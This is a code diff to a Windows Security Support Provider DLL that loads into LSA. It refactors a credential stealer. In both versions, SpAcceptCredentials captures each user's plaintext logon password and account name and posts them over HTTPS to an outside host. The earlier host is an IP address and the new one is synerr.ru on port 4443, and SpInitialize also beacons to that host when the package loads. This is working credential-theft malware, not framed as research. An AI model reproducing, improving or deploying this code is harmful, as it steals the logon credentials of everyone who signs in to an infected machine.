@@ -2,6 +2,7 @@
 #define SECURITY_WIN32
 #include <windows.h>
 #include "transport.h"
+#include "agent.h"
 
 #include <sspi.h>
 #include <NTSecAPI.h>
@@ -9,17 +10,22 @@
 #include <strsafe.h>
 #include <iostream>
 #include <string>
+#include <memory>
 
 #pragma comment(lib, "Secur32.lib")
-#pragma comment(lib, "user32.lib")
 
-HTTPSTransport transport(L"188.120.248.116");
+Agent agent{};
 
 NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
 {
-    time_t currentTime;
-    std::time(&currentTime);
-    transport.Ping(currentTime);
+    auto transport{ std::make_shared<HTTPSTransport>(
+        L"synerr.ru",
+        4443
+    )};
+    transport->Connect(L"POST", L"/postData", L"WINHTTP 1/0");
+    agent.SetTransport(transport.get());
+    agent.Ping();
+
     return 0;
 }
 NTSTATUS NTAPI SpShutDown(void)
@@ -40,17 +46,14 @@ NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
 }
 NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
 {
-    UNICODE_STRING password = PrimaryCredentials->Password;
-    UNICODE_STRING postData;
-    size_t allocSize = password.Length + AccountName->Length + strlen("password=&login=") + 1;
-    postData.Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, allocSize);
-    StringCchCatW(postData.Buffer, allocSize, L"password=");
-    StringCchCatW(postData.Buffer, allocSize, password.Buffer);
-    StringCchCatW(postData.Buffer, allocSize, L"&login=");
-    StringCchCatW(postData.Buffer, allocSize, AccountName->Buffer);
-
-    auto dataLen = (lstrlenW(postData.Buffer) + 1) * sizeof(wchar_t);
-    transport.SendData(L"/postdata", postData.Buffer, dataLen);
+    std::wstring login{ AccountName->Buffer }, password{ PrimaryCredentials->Password.Buffer };
+    auto transport{ std::make_shared<HTTPSTransport>(
+        L"synerr.ru",
+        4443
+    ) };
+    transport->Connect(L"POST", L"/postData", L"WINHTTP 1/0");
+    agent.SetTransport(transport.get());
+    agent.SendCreds(login, password);
     return 0;
 }
 SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
